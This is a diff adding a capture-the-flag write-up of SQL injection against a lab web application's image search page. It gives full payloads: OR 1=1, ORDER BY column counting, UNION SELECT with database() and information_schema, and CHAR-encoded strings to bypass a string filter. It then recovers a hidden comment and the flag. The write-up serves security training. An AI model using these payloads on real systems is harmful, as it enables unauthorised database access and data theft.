@@ -1,0 +1,118 @@
+The page 'search image' http://192.168.56.101/index.php?page=searchimg display a
+search field to look for images.
+
+The field accepts only digits and strings
+
+We can see it's a GET request by looking at the url :
+
+http://192.168.56.101/?page=member&id=5&Submit=Submit#
+the GET dictionnarie receives the following set of ker values
+	- page -> searchimg
+	- id = 5
+	- submit -> subbmit
+
+We put the value 1 and get the following answer:
+
+ID: 1
+Title: Nsa
+Url : https://www.nsa.org/img.jpg
+
+We can determine the SQL request crafted by the server is in the following form:
+
+SELECT ?id, ?title, ?url FROM ?table_name
+WHERE ?id = 1
+
+It is sensible to injection because we can procede to an arithmetic operation :
+searching for 1+1 gives us the result for id=2
+
+In order to get all the result possible we look for a way to get the last statement
+true for each row.
+SELECT ?id, ?title, ?url FROM ?table_name
+ WHERE ?id = 1 OR 1=1
+
+we type 1 OR 1=1 in the search field and we get all the result because every row
+is considered true.
+
+we find this one that indicates that the member with ID = 5 may have a flag:
+
+ID: 5 OR 1=1
+Title: Hack me ?
+Url : borntosec.ddns.net/images.png
+
+We need to dertermine the number of field the sql sends because we will craft an
+injection with UNION. To do that we user ORDER BY. We will try a number until we find
+an error. We craft the following SQL request
+
+SQL :
+[...]
+WHERE id= 5
+ORDER BY 3
+
+url :
+http://192.168.56.101/index.php?page=searchimg&Submit=Submit&id=5 ORDER BY 3
+
+-> this one gives us an error, the request sends two fields.
+
+We want to find the name of the database with the database() call :
+
+SQL :
+[...]
+WHERE id=10 (= 10 because we know it doesn't exist so we get only one result)
+UNION
+SELECT 1, database()
+
+url :
+http://192.168.56.101/index.php?page=searchimg&Submit=Submit&id=10 UNION SELECT 1,database()
+
+we get the following response :
+
+ID: 10 UNION SELECT 1,database()
+Title: Member_images
+Url : 1
+
+database name = Member_images
+
+We look for the list of table using the 'information_schema.TABLES', we need to
+select the TABLE_NAME column of 'information_schema.TABLES'
+
+http://192.168.56.101/index.php?page=searchimg&Submit=Submit&id=25
+UNION SELECT 1, TABLE_NAME FROM information_schema.TABLES
+WHERE TABLE_SCHEMA = CHAR(077,101,109,098,101,114,095,105,109,097,103,101,115)
+
+we use the function CHAR because we know the server doesn't accept strings.
+the numbers correspond to the ASCII value of Member_images
+
+It gives us the name of the only table : list_images
+
+We want to know the name of all the columns in the table list_images :
+
+http://192.168.56.101/index.php?page=searchimg&Submit=Submit&id=25
+UNION SELECT 1, COLUMN_NAME FROM information_schema.COLUMNS
+WHERE TABLE_SCHEMA = CHAR(077,101,109,098,101,114,095,105,109,097,103,101,115)
+AND TABLE_NAME = CHAR(108,105,115,116,095,105,109,097,103,101,115)
+
+
+
+we get the following columns : id, url, title, comment
+we craft the last injection where we try all the columns:
+
+http://192.168.56.101/index.php?page=searchimg&Submit=Submit&id=25 OR 1=1
+UNION SELECT id, url
+FROM list_images
+
+http://192.168.56.101/index.php?page=searchimg&Submit=Submit&id=25 OR 1=1
+UNION SELECT id, title
+FROM list_images
+
+http://192.168.56.101/index.php?page=searchimg&Submit=Submit&id=25 OR 1=1
+UNION SELECT id, comment
+FROM list_images
+
+
+for id = 5 we get this comment :
+If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
+
+the flag is sha256('albatroz')
+
+how to secure :
+ - sanitize input
